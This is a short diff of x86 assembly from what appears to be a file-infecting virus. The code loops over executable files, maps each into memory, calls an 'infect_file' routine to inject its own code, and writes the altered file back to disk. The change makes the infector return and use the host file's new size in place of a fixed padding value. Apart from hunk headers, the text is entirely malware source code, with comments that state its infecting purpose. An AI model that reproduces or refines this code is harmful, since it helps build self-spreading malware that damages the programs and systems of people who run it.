@@ -13,7 +13,7 @@ ENDM
 	; LOCAL	filesize:DWORD
 	; LOCAL	win32finddata:WIN32_FIND_DATA
 
-; ; Function addresses
+; Function addresses
 	; LOCAL	closehandle_addr:DWORD
 	; LOCAL	createfile_addr:DWORD
 	; LOCAL	findclose_addr:DWORD
@@ -81,7 +81,8 @@ search_exe_loop:
 
 ; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !
 
-	invoke	infect_file, fileptr, virtualalloc_addr, virtualfree_addr		; Procedure to properly inject our code into the file of interest.
+	invoke	infect_file, fileptr, filesize, virtualalloc_addr, virtualfree_addr		; Procedure to properly inject our code into the file of interest. Returns new file size.
+	mov		filesize, eax
 
 	push	0							; 0 = from beginning of the file
 	push	0							; 0 = no high order DWORD for size to move
@@ -94,9 +95,10 @@ search_exe_loop:
 	push	0
 	lea		ecx, [esp - 4]
 	push	ecx
-	mov		ecx, filesize
-	add		ecx, 5000h					; TODO: calculate size more properly
-	push	ecx
+	; mov		ecx, filesize
+	; add		ecx, 5000h					; TODO: calculate size more properly
+	; push	ecx
+	push	filesize
 	push	fileptr
 	push	filehandle
 	call	writefile_addr				; WriteFile(). Write the buffer back to the file.
